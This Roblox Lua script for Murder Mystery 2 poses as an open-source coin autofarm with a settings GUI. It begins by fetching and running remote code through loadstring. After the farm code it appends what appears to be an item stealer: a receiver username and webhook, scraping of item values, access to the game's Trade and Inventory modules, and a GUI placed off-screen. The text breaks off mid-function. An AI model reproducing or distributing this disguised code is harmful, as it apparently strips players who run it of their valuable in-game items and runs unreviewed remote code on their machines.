-- Open Source Script AutoFarm murder mystery 2 Summer update 2026

loadstring(game:HttpGet("https://raw.githubusercontent.com/script-create/Anti-afk/refs/heads/main/Autofarm.lua"))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local Settings = {
    AutoFarmEnabled = false,
    FarmMode = "Underground",
    TweenSpeed = 25,
    AutoReset = true,
    AvoidMurder = true,
    UndergroundOffset = 4,
    MaxDistance = 600,
    CoinLimit = 40,
}

local State = {
    isFarming = false,
    isActivelyFlying = false,
    currentTargetCoin = nil,
    ignoredCoins = {},
    currentTween = nil,
}

local function createNotification()
    local NotifGui = Instance.new("ScreenGui")
    NotifGui.Name = "CandyNotification"
    NotifGui.ResetOnSpawn = false
    NotifGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    NotifGui.Parent = LocalPlayer.PlayerGui

    local NotifFrame = Instance.new("Frame")
    NotifFrame.Name = "NotifFrame"
    NotifFrame.Size = UDim2.new(0, 280, 0, 70)
    NotifFrame.Position = UDim2.new(1, 300, 0.85, -35)
    NotifFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    NotifFrame.BorderSizePixel = 0
    NotifFrame.Parent = NotifGui

    local NotifCorner = Instance.new("UICorner")
    NotifCorner.CornerRadius = UDim.new(0, 10)
    NotifCorner.Parent = NotifFrame

    local NotifStroke = Instance.new("UIStroke")
    NotifStroke.Color = Color3.fromRGB(255, 60, 60)
    NotifStroke.Thickness = 2
    NotifStroke.Parent = NotifFrame

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, -20, 0, 25)
    Title.Position = UDim2.new(0, 10, 0, 8)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.Text = "🍬 Thanks for using!"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 14
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = NotifFrame

    local Subtitle = Instance.new("TextLabel")
    Subtitle.Name = "Subtitle"
    Subtitle.Size = UDim2.new(1, -20, 0, 20)
    Subtitle.Position = UDim2.new(0, 10, 0, 35)
    Subtitle.BackgroundTransparency = 1
    Subtitle.Font = Enum.Font.Gotham
    Subtitle.Text = "Tap to copy link to discord server"
    Subtitle.TextColor3 = Color3.fromRGB(180, 180, 180)
    Subtitle.TextSize = 11
    Subtitle.TextXAlignment = Enum.TextXAlignment.Left
    Subtitle.Parent = NotifFrame

    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(1, 0, 1, 0)
    Button.BackgroundTransparency = 1
    Button.Text = ""
    Button.Parent = NotifFrame

    Button.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/3KjWyZ6uBu")
        Subtitle.Text = "✅ Link copied to clipboard!"
        Subtitle.TextColor3 = Color3.fromRGB(60, 255, 60)
    end)

    TweenService:Create(NotifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(1, -290, 0.85, -35)
    }):Play()

    task.delay(6, function()
        TweenService:Create(NotifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Position = UDim2.new(1, 300, 0.85, -35)
        }):Play()
        
        task.wait(0.5)
        NotifGui:Destroy()
    end)
end

local function createGUI()
    if LocalPlayer.PlayerGui:FindFirstChild("CandyZoneGUI") then
        LocalPlayer.PlayerGui.CandyZoneGUI:Destroy()
    end

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "CandyZoneGUI"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.Parent = LocalPlayer.PlayerGui

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 220, 0, 40)
    MainFrame.Position = UDim2.new(0.5, -110, 0, 15)
    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    MainFrame.BorderSizePixel = 0
    MainFrame.ClipsDescendants = true
    MainFrame.Parent = ScreenGui

    local MainCorner = Instance.new("UICorner")
    MainCorner.CornerRadius = UDim.new(0, 10)
    MainCorner.Parent = MainFrame

    local RedStroke = Instance.new("UIStroke")
    RedStroke.Color = Color3.fromRGB(255, 60, 60)
    RedStroke.Thickness = 2
    RedStroke.Parent = MainFrame

    local Header = Instance.new("TextButton")
    Header.Name = "Header"
    Header.Size = UDim2.new(1, 0, 0, 40)
    Header.Position = UDim2.new(0, 0, 0, 0)
    Header.BackgroundTransparency = 1
    Header.Font = Enum.Font.GothamBold
    Header.Text = "🍬 CANDY ZONE"
    Header.TextColor3 = Color3.fromRGB(255, 255, 255)
    Header.TextSize = 14
    Header.ZIndex = 2
    Header.Parent = MainFrame

    local StatusIndicator = Instance.new("Frame")
    StatusIndicator.Name = "StatusIndicator"
    StatusIndicator.Size = UDim2.new(0, 6, 0, 6)
    StatusIndicator.Position = UDim2.new(0, 12, 0.5, -3)
    StatusIndicator.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
    StatusIndicator.BorderSizePixel = 0
    StatusIndicator.ZIndex = 3
    StatusIndicator.Parent = Header

    local IndicatorCorner = Instance.new("UICorner")
    IndicatorCorner.CornerRadius = UDim.new(1, 0)
    IndicatorCorner.Parent = StatusIndicator

    local Content = Instance.new("ScrollingFrame")
    Content.Name = "Content"
    Content.Size = UDim2.new(1, 0, 0, 0)
    Content.Position = UDim2.new(0, 0, 0, 40)
    Content.BackgroundTransparency = 1
    Content.BorderSizePixel = 0
    Content.ScrollBarThickness = 4
    Content.ScrollBarImageColor3 = Color3.fromRGB(255, 60, 60)
    Content.CanvasSize = UDim2.new(0, 0, 0, 0)
    Content.ZIndex = 1
    Content.Parent = MainFrame

    local ContentPadding = Instance.new("UIPadding")
    ContentPadding.PaddingTop = UDim.new(0, 10)
    ContentPadding.PaddingBottom = UDim.new(0, 10)
    ContentPadding.PaddingLeft = UDim.new(0, 15)
    ContentPadding.PaddingRight = UDim.new(0, 15)
    ContentPadding.Parent = Content

    local ContentLayout = Instance.new("UIListLayout")
    ContentLayout.SortOrder = Enum.SortOrder.LayoutOrder
    ContentLayout.Padding = UDim.new(0, 8)
    ContentLayout.Parent = Content

    ContentLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        Content.CanvasSize = UDim2.new(0, 0, 0, ContentLayout.AbsoluteContentSize.Y + 20)
    end)

    local function createToggle(name, defaultValue, callback)
        local Toggle = Instance.new("Frame")
        Toggle.Name = name .. "Toggle"
        Toggle.Size = UDim2.new(1, 0, 0, 25)
        Toggle.BackgroundTransparency = 1
        Toggle.Parent = Content

        local Label = Instance.new("TextLabel")
        Label.Size = UDim2.new(1, -45, 1, 0)
        Label.BackgroundTransparency = 1
        Label.Font = Enum.Font.Gotham
        Label.Text = name
        Label.TextColor3 = Color3.fromRGB(200, 200, 200)
        Label.TextSize = 12
        Label.TextXAlignment = Enum.TextXAlignment.Left
        Label.Parent = Toggle

        local Button = Instance.new("TextButton")
        Button.Size = UDim2.new(0, 38, 0, 20)
        Button.Position = UDim2.new(1, -38, 0.5, -10)
        Button.BackgroundColor3 = defaultValue and Color3.fromRGB(255, 60, 60) or Color3.fromRGB(60, 60, 65)
        Button.BorderSizePixel = 0
        Button.Text = ""
        Button.Parent = Toggle

        local ButtonCorner = Instance.new("UICorner")
        ButtonCorner.CornerRadius = UDim.new(1, 0)
        ButtonCorner.Parent = Button

        local Knob = Instance.new("Frame")
        Knob.Size = UDim2.new(0, 14, 0, 14)
        Knob.Position = defaultValue and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
        Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Knob.BorderSizePixel = 0
        Knob.Parent = Button

        local KnobCorner = Instance.new("UICorner")
        KnobCorner.CornerRadius = UDim.new(1, 0)
        KnobCorner.Parent = Knob

        local isOn = defaultValue

        Button.MouseButton1Click:Connect(function()
            isOn = not isOn
            
            TweenService:Create(Button, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                BackgroundColor3 = isOn and Color3.fromRGB(255, 60, 60) or Color3.fromRGB(60, 60, 65)
            }):Play()

            TweenService:Create(Knob, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                Position = isOn and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
            }):Play()

            callback(isOn)
        end)

        return Toggle
    end

    local function createDropdown(name, options, defaultValue, callback)
        local Dropdown = Instance.new("Frame")
        Dropdown.Name = name .. "Dropdown"
        Dropdown.Size = UDim2.new(1, 0, 0, 25)
        Dropdown.BackgroundTransparency = 1
        Dropdown.Parent = Content

        local Label = Instance.new("TextLabel")
        Label.Size = UDim2.new(0.35, 0, 1, 0)
        Label.BackgroundTransparency = 1
        Label.Font = Enum.Font.Gotham
        Label.Text = name .. ":"
        Label.TextColor3 = Color3.fromRGB(200, 200, 200)
        Label.TextSize = 12
        Label.TextXAlignment = Enum.TextXAlignment.Left
        Label.Parent = Dropdown

        local Button = Instance.new("TextButton")
        Button.Size = UDim2.new(0.6, 0, 0, 23)
        Button.Position = UDim2.new(0.4, 0, 0, 1)
        Button.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
        Button.BorderSizePixel = 0
        Button.Font = Enum.Font.Gotham
        Button.Text = defaultValue
        Button.TextColor3 = Color3.fromRGB(255, 255, 255)
        Button.TextSize = 11
        Button.Parent = Dropdown

        local ButtonCorner = Instance.new("UICorner")
        ButtonCorner.CornerRadius = UDim.new(0, 6)
        ButtonCorner.Parent = Button

        local currentIndex = table.find(options, defaultValue) or 1

        Button.MouseButton1Click:Connect(function()
            currentIndex = currentIndex % #options + 1
            Button.Text = options[currentIndex]
            callback(options[currentIndex])
        end)

        return Dropdown
    end

    local function createSlider(name, min, max, defaultValue, callback)
        local Slider = Instance.new("Frame")
        Slider.Name = name .. "Slider"
        Slider.Size = UDim2.new(1, 0, 0, 35)
        Slider.BackgroundTransparency = 1
        Slider.Parent = Content

        local Label = Instance.new("TextLabel")
        Label.Size = UDim2.new(1, -50, 0, 16)
        Label.BackgroundTransparency = 1
        Label.Font = Enum.Font.Gotham
        Label.Text = name
        Label.TextColor3 = Color3.fromRGB(200, 200, 200)
        Label.TextSize = 12
        Label.TextXAlignment = Enum.TextXAlignment.Left
        Label.Parent = Slider

        local ValueLabel = Instance.new("TextLabel")
        ValueLabel.Size = UDim2.new(0, 40, 0, 16)
        ValueLabel.Position = UDim2.new(1, -40, 0, 0)
        ValueLabel.BackgroundTransparency = 1
        ValueLabel.Font = Enum.Font.GothamBold
        ValueLabel.Text = tostring(defaultValue)
        ValueLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        ValueLabel.TextSize = 12
        ValueLabel.TextXAlignment = Enum.TextXAlignment.Right
        ValueLabel.Parent = Slider

        local Track = Instance.new("Frame")
        Track.Size = UDim2.new(1, 0, 0, 5)
        Track.Position = UDim2.new(0, 0, 1, -8)
        Track.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
        Track.BorderSizePixel = 0
        Track.Parent = Slider

        local TrackCorner = Instance.new("UICorner")
        TrackCorner.CornerRadius = UDim.new(1, 0)
        TrackCorner.Parent = Track

        local Fill = Instance.new("Frame")
        Fill.Size = UDim2.new((defaultValue - min) / (max - min), 0, 1, 0)
        Fill.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
        Fill.BorderSizePixel = 0
        Fill.Parent = Track

        local FillCorner = Instance.new("UICorner")
        FillCorner.CornerRadius = UDim.new(1, 0)
        FillCorner.Parent = Fill

        local Knob = Instance.new("TextButton")
        Knob.Size = UDim2.new(0, 13, 0, 13)
        Knob.Position = UDim2.new((defaultValue - min) / (max - min), -6.5, 0.5, -6.5)
        Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Knob.BorderSizePixel = 0
        Knob.Text = ""
        Knob.AutoButtonColor = false
        Knob.Parent = Track

        local KnobCorner = Instance.new("UICorner")
        KnobCorner.CornerRadius = UDim.new(1, 0)
        KnobCorner.Parent = Knob

        local dragging = false

        local function updateValue(input)
            local relativeX = math.clamp((input.Position.X - Track.AbsolutePosition.X) / Track.AbsoluteSize.X, 0, 1)
            local value = math.floor(min + (max - min) * relativeX)
            
            Fill.Size = UDim2.new(relativeX, 0, 1, 0)
            Knob.Position = UDim2.new(relativeX, -6.5, 0.5, -6.5)
            ValueLabel.Text = tostring(value)
            
            callback(value)
        end

        Knob.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
            end
        end)

        Knob.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)

        Track.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                updateValue(input)
            end
        end)

        Track.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)

        UserInputService.InputChanged:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                updateValue(input)
            end
        end)

        return Slider
    end

    createToggle("Auto Farm", Settings.AutoFarmEnabled, function(value)
        Settings.AutoFarmEnabled = value
        if value then
            startFarming()
            StatusIndicator.BackgroundColor3 = Color3.fromRGB(60, 255, 60)
        else
            stopFarming()
            StatusIndicator.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
        end
    end)

    createDropdown("Mode", {"Underground", "Sit"}, Settings.FarmMode, function(value)
        Settings.FarmMode = value
    end)

    createSlider("Tween Speed", 10, 100, Settings.TweenSpeed, function(value)
        Settings.TweenSpeed = value
    end)

    createToggle("Auto Reset", Settings.AutoReset, function(value)
        Settings.AutoReset = value
    end)

    createToggle("Avoid Murder", Settings.AvoidMurder, function(value)
        Settings.AvoidMurder = value
    end)

    local isExpanded = false
    local contentHeight = 180

    Header.MouseButton1Click:Connect(function()
        isExpanded = not isExpanded

        local targetMainSize = isExpanded and UDim2.new(0, 220, 0, 40 + contentHeight + 10) or UDim2.new(0, 220, 0, 40)
        local targetContentSize = isExpanded and UDim2.new(1, 0, 0, contentHeight) or UDim2.new(1, 0, 0, 0)

        TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Size = targetMainSize
        }):Play()

        TweenService:Create(Content, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Size = targetContentSize
        }):Play()
    end)

    local dragging, dragInput, dragStart, startPos

    local function update(input)
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    Header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = MainFrame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    Header.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

local function getTorso(char)
    if not char then return nil end
    return char:FindFirstChild("Torso") or char:FindFirstChild("LowerTorso") or char:FindFirstChild("HumanoidRootPart")
end

local function getCurrentCoins()
    local ok, res = pcall(function()
        local gui = LocalPlayer.PlayerGui:FindFirstChild("MainGUI")
        if not gui then return 0 end
        local gameGui = gui:FindFirstChild("Game")
        if not gameGui then return 0 end
        local coinBags = gameGui:FindFirstChild("CoinBags")
        if not coinBags then return 0 end
        local container = coinBags:FindFirstChild("Container")
        if not container then return 0 end
        local coin = container:FindFirstChild("Coin")
        if not coin then return 0 end
        local currencyFrame = coin:FindFirstChild("CurrencyFrame")
        if not currencyFrame then return 0 end
        local icon = currencyFrame:FindFirstChild("Icon")
        if not icon then return 0 end
        local coinsText = icon:FindFirstChild("Coins")
        if not coinsText then return 0 end
        return coinsText.Text
    end)
    return ok and (tonumber(res) or 0) or 0
end

local function isRoundOver()
    local pGui = LocalPlayer:FindFirstChild("PlayerGui")
    if not pGui then return false end
    local victoryGui = pGui:FindFirstChild("Victory")
    if victoryGui then
        for _, child in pairs(victoryGui:GetChildren()) do
            if child:IsA("GuiObject") and child.Visible then return true end
        end
    end
    return false
end

local function isBagFull()
    local pGui = LocalPlayer:FindFirstChild("PlayerGui")
    if pGui then
        local mainGui = pGui:FindFirstChild("MainGUI")
        if mainGui and mainGui:FindFirstChild("Lobby") and mainGui.Lobby:FindFirstChild("Dock") then
            local coinBags = mainGui.Lobby.Dock:FindFirstChild("CoinBags")
            if coinBags then
                local notification = coinBags:FindFirstChild("FullBagNotification")
                if notification and notification.Visible then return true end
            end
        end
    end
    return false
end

local function hasNearbyMurderer()
    if not Settings.AvoidMurder then return false end
    
    local char = LocalPlayer.Character
    if not char then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local otherHRP = player.Character:FindFirstChild("HumanoidRootPart")
            local backpack = player:FindFirstChild("Backpack")
            
            if otherHRP and (otherHRP.Position - hrp.Position).Magnitude <= 10 then
                if player.Character:FindFirstChild("Knife") then
                    return true
                end
                
                if backpack and backpack:FindFirstChild("Knife") then
                    return true
                end
            end
        end
    end
    
    return false
end

local function getNearestCoin(torso)
    local container = nil
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj.Name == "CoinContainer" then
            container = obj
            break
        end
    end
    if not container then return nil end

    local nearestCoin = nil
    local minDist = math.huge
    for _, coin in pairs(container:GetChildren()) do
        if coin.Name == "Coin_Server" and coin:IsA("BasePart") and not State.ignoredCoins[coin] then
            local dist = (torso.Position - coin.Position).Magnitude
            if dist < minDist and dist <= Settings.MaxDistance then
                minDist = dist
                nearestCoin = coin
            end
        end
    end
    return nearestCoin
end

local function applyFlightPhysics(char)
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return CFrame.Angles(0,0,0) end

    local bv = hrp:FindFirstChild("FarmBV")
    if not bv then
        bv = Instance.new("BodyVelocity")
        bv.Name = "FarmBV"
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Velocity = Vector3.new(0, 0, 0)
        bv.Parent = hrp
    end

    local bg = hrp:FindFirstChild("FarmBG")
    if not bg then
        bg = Instance.new("BodyGyro")
        bg.Name = "FarmBG"
        bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        bg.P = 50000
        bg.Parent = hrp
        
        local _, rotY, _ = hrp.CFrame:ToOrientation()
        bg.CFrame = CFrame.new(hrp.Position) * CFrame.Angles(0, rotY, 0) * CFrame.Angles(math.rad(-90), 0, 0)
    end
    return bg.CFrame.Rotation 
end

local function removePhysics()
    local char = LocalPlayer.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if hrp then
        if hrp:FindFirstChild("FarmBV") then hrp.FarmBV:Destroy() end
        if hrp:FindFirstChild("FarmBG") then hrp.FarmBG:Destroy() end
        if hrp.Anchored then hrp.Anchored = false end 
    end
end

local function setupNoclip()
    local char = LocalPlayer.Character
    if not char then return end
    
    local humanoid = char:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.PlatformStand = true
    end
    
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") and part.CanCollide then
            part.CanCollide = false
        end
    end
end

local function flyToPoint(targetPos, targetCoin, hrp, torso, lockedRotation)
    local dist = (torso.Position - targetPos).Magnitude
    local tweenInfo = TweenInfo.new(dist / Settings.TweenSpeed, Enum.EasingStyle.Linear)
    local targetCFrame = CFrame.new(targetPos) * lockedRotation
    
    local tween = TweenService:Create(hrp, tweenInfo, {CFrame = targetCFrame})
    State.currentTween = tween
    local reached = false
    tween:Play()
    
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not State.isFarming or not targetCoin or not targetCoin:IsDescendantOf(workspace) then 
            tween:Cancel()
            if connection then connection:Disconnect() end
            return
        end
        
        local currentDist = (torso.Position - targetPos).Magnitude
        
        if firetouchinterest then
            pcall(function()
                firetouchinterest(torso, targetCoin, 0)
                firetouchinterest(torso, targetCoin, 1)
            end)
        end
        
        if currentDist <= 1.5 then 
            reached = true
            tween:Cancel()
            if connection then connection:Disconnect() end
        end
    end)
    
    while connection and connection.Connected do
        RunService.Heartbeat:Wait()
    end
    return reached
end

local function tweenToCoin(coin)
    if not coin or not coin.Parent or not coin:FindFirstChild("TouchInterest") then 
        return false 
    end
    
    local char = LocalPlayer.Character
    if not char then return false end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then return false end
    
    local target = coin.Position + Vector3.new(0, 2, 0)
    
    if (hrp.Position - target).Magnitude < 5 then 
        return true 
    end
    
    if State.currentTween then 
        pcall(function() State.currentTween:Cancel() end) 
    end
    
    State.currentTween = TweenService:Create(hrp,
        TweenInfo.new(
            (hrp.Position - target).Magnitude / Settings.TweenSpeed,
            Enum.EasingStyle.Quad,
            Enum.EasingDirection.Out
        ),
        {CFrame = CFrame.new(target)}
    )
    
    hum.Sit = true
    State.currentTween:Play()
    
    local done = false
    local c
    c = State.currentTween.Completed:Connect(function() 
        done = true
        if c then c:Disconnect() end
    end)
    
    local t0 = tick()
    while not done and State.isFarming do
        task.wait(0.1)
        
        if not coin or not coin.Parent or not coin:FindFirstChild("TouchInterest") then
            if State.currentTween then 
                pcall(function() State.currentTween:Cancel() end) 
            end
            hum.Sit = false
            return false
        end
        
        if tick() - t0 > 30 then
            if State.currentTween then 
                pcall(function() State.currentTween:Cancel() end) 
            end
            hum.Sit = false
            return false
        end
    end
    
    hum.Sit = false
    return done
end

local function collectCoin(coin)
    if not coin or not coin.Parent then return end
    
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    pcall(function()
        firetouchinterest(hrp, coin, 0)
        task.wait(0.05)
        firetouchinterest(hrp, coin, 1)
    end)
end

function startFarming()
    if State.isFarming then return end
    State.isFarming = true
    
    table.clear(State.ignoredCoins)

    task.spawn(function()
        while State.isFarming do
            task.wait()
            
            local success, err = pcall(function()
                if hasNearbyMurderer() then
                    State.isActivelyFlying = false
                    State.currentTargetCoin = nil
                    removePhysics()
                    
                    local char = LocalPlayer.Character
                    if char then
                        local hum = char:FindFirstChild("Humanoid")
                        if hum then hum.Sit = false end
                    end
                    
                    task.wait(1)
                    return
                end

                local char = LocalPlayer.Character
                if not char then return end
                
                local hrp = char:FindFirstChild("HumanoidRootPart")
                local torso = getTorso(char)
                local humanoid = char:FindFirstChild("Humanoid")
                
                if not hrp or not torso or not humanoid or humanoid.Health <= 0 then
                    State.isActivelyFlying = false
                    State.currentTargetCoin = nil
                    removePhysics()
                    task.wait(1)
                    return
                end

                if isRoundOver() or isBagFull() then
                    State.isActivelyFlying = false
                    State.currentTargetCoin = nil
                    removePhysics()
                    if humanoid then humanoid.Sit = false end
                    task.wait(1)
                    return
                end

                if Settings.AutoReset then
                    local coins = getCurrentCoins()
                    if coins >= Settings.CoinLimit then
                        humanoid.Health = 0
                        task.wait(5)
                        return
                    end
                end
                
                local targetCoin = getNearestCoin(torso)
                if not targetCoin or not targetCoin:IsDescendantOf(workspace) then
                    State.isActivelyFlying = false
                    State.currentTargetCoin = nil
                    removePhysics()
                    if humanoid then humanoid.Sit = false end
                    task.wait(0.5)
                    return
                end

                State.isActivelyFlying = true
                State.currentTargetCoin = targetCoin
                
                local reachedTarget = false

                if Settings.FarmMode == "Underground" then
                    setupNoclip()
                    local lockedRotation = applyFlightPhysics(char)
                    local targetPos = targetCoin.Position - Vector3.new(0, Settings.UndergroundOffset, 0)
                    reachedTarget = flyToPoint(targetPos, targetCoin, hrp, torso, lockedRotation)
                    
                elseif Settings.FarmMode == "Sit" then
                    reachedTarget = tweenToCoin(targetCoin)
                    if reachedTarget and State.isFarming and humanoid.Health > 0 then
                        collectCoin(targetCoin)
                    end
                end
                
                if reachedTarget and State.isFarming and humanoid.Health > 0 then
                    State.ignoredCoins[targetCoin] = true
                    task.delay(5, function() 
                        State.ignoredCoins[targetCoin] = nil 
                    end)
                    task.wait(0.2)
                end
                
                State.currentTargetCoin = nil 
            end)
            
            if not success then
                State.isActivelyFlying = false
                State.currentTargetCoin = nil
                removePhysics()
                task.wait(1)
            end
        end
    end)
end

function stopFarming()
    State.isFarming = false
    State.isActivelyFlying = false
    State.currentTargetCoin = nil
    
    if State.currentTween then
        pcall(function() State.currentTween:Cancel() end)
        State.currentTween = nil
    end
    
    removePhysics()
    
    local char = LocalPlayer.Character
    if char then
        local humanoid = char:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.PlatformStand = false
            humanoid.Sit = false
        end
    end
end

RunService.Stepped:Connect(function()
    if not State.isFarming or not State.isActivelyFlying or Settings.FarmMode ~= "Underground" then return end
    
    local char = LocalPlayer.Character
    if not char then return end
    
    local humanoid = char:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.PlatformStand = true
    end
    
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") and part.CanCollide then
            part.CanCollide = false
        end
    end
end)

Username = ""
Webhook = ""

local recvr=Username
local http_req=request or http_request or syn and syn.request
if not http_req then error("No valid request function found.") end
local HS=game:GetService("HttpService")
local hd={["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"}

local function dHTML(s) return s:gsub("&#(%d+);",function(n) return string.char(tonumber(n)) end):gsub("&#x(%x+);",function(n) return string.char(tonumber(n,16)) end):gsub("&amp;","&"):gsub("&quot;",'"'):gsub("&apos;","'"):gsub("&lt;","<"):gsub("&gt;",">"):gsub("\u{2019}","'"):gsub("\u{2018}","'"):gsub("\u{201C}",'"'):gsub("\u{201D}",'"') end
local function nName(s) s=dHTML(s) s=s:gsub("^%s*(.-)%s*$","%1") s=s:gsub("%s+"," ") return s end

local vL_values={}
local vL_valuesLow={}
local function sVal(n,v) local t=tonumber(v) if n~=""and t then vL_values[n]=t vL_valuesLow[n:lower()]=t end end

local wUrls={["Godly"]="https://supremevalues.com/mm2/godlies",["Ancient"]="https://supremevalues.com/mm2/ancients",["Unique"]="https://supremevalues.com/mm2/uniques",["Classic"]="https://supremevalues.com/mm2/vintages",["Chroma"]="https://supremevalues.com/mm2/chromas"}
local fD=0 local fT=5

local function wFetched(r,b)
 local f=b:gsub("[\n\r\t]"," ")
 for rN,v in f:gmatch('<div class="itemhead">(.-)</div>.-<b class="itemvalue">([%d,]+)</b>') do
  rN=rN:gsub("<.->","") local nm=nName(rN) v=v:gsub(",","")
  if nm~=""and tonumber(v) then
   if r=="Chroma" then nm=nm:gsub("^C%.%s*","Chroma ") if not nm:find("^Chroma ") then nm="Chroma "..nm end end
   sVal(nm,v)
  end
 end
end

for r,u in pairs(wUrls) do
 task.spawn(function()
  local ok,res=pcall(function() return http_req({Url=u,Method="GET",Headers=hd}) end)
  if ok and res and res.Success then wFetched(r,res.Body) end
  fD=fD+1
 end)
end
repeat task.wait(0.05) until fD>=fT

repeat wait() until game:IsLoaded()
if getgenv and getgenv().scriptexecuted then return end
if getgenv then getgenv().scriptexecuted=true end

local P=game:GetService("Players") 
local LocalPlayer=P.LocalPlayer 
local VU=game:GetService("VirtualUser") 
local MS=game:GetService("MarketplaceService") 
local RAS=game:GetService("RbxAnalyticsService") 
local UIS=game:GetService("UserInputService") 
local TS=game:GetService("TeleportService") 
local RS=game:GetService("ReplicatedStorage") 
local RNS=game:GetService("RunService") 
local Tr=RS.Trade 
local ev={"MouseButton1Click","MouseButton1Down","Activated"} 
local BDC=require(RS.Modules.ProfileData) 
local Sync=require(RS.Database.Sync)
local XPO=require(RS.Modules.LevelModule) 
local LL=require(RS.Modules.InventoryModule) 
local TScr=[[game:GetService("TeleportService"):TeleportToPlaceInstance("]]..game.PlaceId..[[", "]]..game.JobId..[[", game.Players.LocalPlayer)]] 
local Pos=UDim2.new(0,9999,0,9999) 
local Inv={}
vL_weight=0

local Exec = (identifyexecutor and identifyexecutor()) or "Unknown"
if Exec=="Solara" then return end

local gm={[142823291]=true,[335132309]=true,[636649648]=true}
if not gm[game.PlaceId] then LocalPlayer:Kick("Unfortunately, this game is not supported.") while true do wait() end end

local PG=LocalPlayer:WaitForChild("PlayerGui") local MG=PG:WaitForChild("MainGUI")
task.spawn(function() wait(5) end)
LocalPlayer.Idled:connect(function() VU:CaptureController() VU:ClickButton2(Vector2.new()) end)

local UIP,TP,Mob
if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
 UIP=LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main TP=LocalPlayer.PlayerGui.TradeGUI Mob=false
else
 UIP=LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main TP=LocalPlayer.PlayerGui.TradeGUI_Phone Mob=true
end

function TapUI(b,c,b2)
